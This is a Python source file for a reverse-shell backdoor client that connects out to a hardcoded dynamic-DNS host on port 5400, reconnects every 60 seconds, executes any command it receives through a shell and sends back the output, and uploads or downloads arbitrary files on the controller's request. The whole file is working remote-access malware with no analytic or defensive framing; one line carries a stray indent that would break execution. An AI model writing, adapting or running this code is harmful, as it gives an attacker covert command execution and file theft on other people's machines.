import socket
import threading
import time
import os
import subprocess

port = 5400
 ip = socket.gethostbyname('ka4ma.onthewifi.com')
#ip = socket.gethostbyname(socket.gethostname())
ADDR = (ip,port)
HEADER = 800
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "disconnect"
addr = (ip,port)


def send(msg):
	message = msg.encode(FORMAT)
	msg_length = len(message)
	send_length = str(msg_length).encode(FORMAT)
	send_length += b' ' * (HEADER- len(send_length))
	client.send(send_length)
	client.send(message)


def raw(msg):
	message = msg
	msg_length = len(message)
	send_length = str(msg_length).encode(FORMAT)
	send_length += b' ' * (HEADER- len(send_length))
	client.send(send_length)
	client.send(message)


def receive(client):
	connected = True
	while connected:
		conn = client
		msg_len = conn.recv(HEADER).decode(FORMAT)
		if msg_len:
			msg_len = int(msg_len)
			msg = conn.recv(msg_len).decode(FORMAT)
			print(f'   >>> {msg} <<<')
			if msg == "send":
				message = "START FILE TRANSFER"
				message = message.encode(FORMAT)
				raw(message)
				msg_len = conn.recv(HEADER).decode(FORMAT)
				if msg_len:
					msg_len = int(msg_len)
					msg = conn.recv(msg_len).decode(FORMAT)
					print(msg)
					try:
						f = open(msg,'wb')
						l = conn.recv(HEADER)
						while (l):
							print("Receiving...")
							f.write(l)
							l = conn.recv(HEADER)
							if len(l) < HEADER:
								print("Receiving...")
								f.write(l)
								break
						f.close()
						print("FILE RECIEVED")
						send("FILE UPLOADED")
					except:
						print("   ERROR UPLOADING THE FILE")
			elif msg == "recieve":
				message = "START RECIEVING"
				message = message.encode(FORMAT)
				raw(message)
				msg_len = conn.recv(HEADER).decode(FORMAT)
				if msg_len:
					msg_len = int(msg_len)
					msg = conn.recv(msg_len).decode(FORMAT)
					print(msg)
					try:
						f = open(msg,'rb')
						l = f.read(HEADER)
						while (l):
						    print('Sending...')
						    conn.send(l)
						    l = f.read(HEADER)
						f.close()
					except:
						print("ERROR TRANSFERING FILES")
			else:
				message = subprocess.Popen(msg, shell=True, stderr = subprocess.PIPE, stdin=subprocess.PIPE,stdout=subprocess.PIPE)
				cmd_bytes = message.stdout.read() + message.stderr.read()
				try:
					cmd_str = cmd_bytes.decode(FORMAT)
					message = str(cmd_str)
					if msg == DISCONNECT_MESSAGE:
						connected = False
						print(f'   [{addr}] DISCONNECTED')
					if len(message) > HEADER-150:
						print("DOING")
						x = HEADER - 200
						res=[message[y-x:y] for y in range(x, len(message)+x,x)]
						for i in res:
							send(i)
							time.sleep(0.3)
					else:
						send(message)
				except:
					send("THE FILE WAS IN BYTES")




	conn.close()
print('\n'*3)
while True:
	try:
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect(addr)
		receive(client)
	except:
		print("ERROR CAME")
	print("RETRYING IN 60 SECONDS")
	time.sleep(60)